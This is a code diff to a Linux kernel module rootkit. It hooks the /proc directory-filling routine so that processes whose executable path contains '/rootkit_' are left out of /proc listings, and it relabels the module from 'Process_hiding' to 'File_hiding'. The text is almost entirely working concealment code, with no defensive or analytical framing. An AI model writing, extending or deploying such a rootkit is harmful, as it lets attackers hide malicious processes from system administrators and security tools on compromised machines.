@@ -54,25 +54,22 @@ bool fake__proc_fill_cache( struct file *file,
                             struct task_struct *task,
                             const void *ptr )
 {
-    unsigned i;
     struct dentry *child, *dir = file->f_path.dentry;
     struct qstr qname = QSTR_INIT(name, len);
     struct inode *inode;
     unsigned type;
     ino_t ino;
-    bool ret;
-    char textbuf[16];
+    bool ret, trigger = false, kill = false;
+    char textbuf[32];
+    struct path path;
+    char* tmp, * pathname;
 
     atomic_inc(&active_read_calls);
 
-    for (i = 0; i < var_count; ++i)
+    snprintf(textbuf, sizeof(textbuf), "%d", (int)(long long)ptr);
+    if ((strcmp(name, textbuf) == 0)) // && (task->tgid == 17643))
     {
-        snprintf(textbuf, sizeof(textbuf), "%d", pid[i]);
-        if (strcmp(name, textbuf) == 0)
-        {
-            ret = true;
-            goto gtfo;
-        }
+        trigger = true;
     }
 
     child = d_hash_and_lookup(dir, &qname);
@@ -85,11 +82,35 @@ bool fake__proc_fill_cache( struct file *file,
             goto end_instantiate;
         }
     }
+
+    if (trigger)
+    {
+        if (PROC_I(d_inode(child))->op.proc_get_link(child, &path)) printk(KERN_INFO "errer\n");
+        else
+        {
+            tmp = (char*)__get_free_page(GFP_TEMPORARY);
+            if (tmp)
+            {
+                pathname = d_path(&path, tmp, PAGE_SIZE - 1);
+                if (!IS_ERR(pathname))
+                {
+                    tmp[PAGE_SIZE - 1] = '\0';
+                    if (strstr(pathname, "/rootkit_"))
+                    {
+                        kill = true;
+                    }
+                }
+
+                free_page((unsigned long)tmp);
+            }
+        }
+    }
+
     inode = d_inode(child);
     ino = inode->i_ino;
     type = inode->i_mode >> 12;
     dput(child);
-    ret = dir_emit(ctx, name, len, ino, type);
+    ret = kill ? true : dir_emit(ctx, name, len, ino, type);
     goto gtfo;
 
 end_instantiate:
@@ -125,7 +146,7 @@ void unhook(void)
 }
 
 int init_module(void){
-    printk(KERN_INFO "Process_hiding loaded.\n");
+    printk(KERN_INFO "File_hiding loaded.\n");
 
     hook();
 
@@ -133,7 +154,7 @@ int init_module(void){
 }
 
 void cleanup_module(void){
-    printk(KERN_INFO "Process_hiding unloaded.\n");
+    printk(KERN_INFO "File_hiding unloaded.\n");
 
     unhook();
     // Prevent other CPUs from crashing due to running unloaded code
